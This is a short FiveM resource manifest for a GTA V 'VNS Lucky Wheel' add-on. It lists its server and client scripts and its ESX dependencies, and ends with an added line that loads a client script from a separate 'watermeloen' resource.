fx_version 'adamant'
game 'gta5'
description 'VNS Lucky Wheel'
version '1.5.3'


server_scripts {
	'@mysql-async/lib/MySQL.lua',
    '@es_extended/locale.lua',
    'locales/*.lua',
	'config.lua',
	'server.lua'
}

client_scripts {
    '@es_extended/locale.lua',
    'locales/*.lua',
	'config.lua',
	'client.lua',
}

dependencies {
	'es_extended',
	'esx_vehicleshop'
}
client_script "@watermeloen/acloader.lua"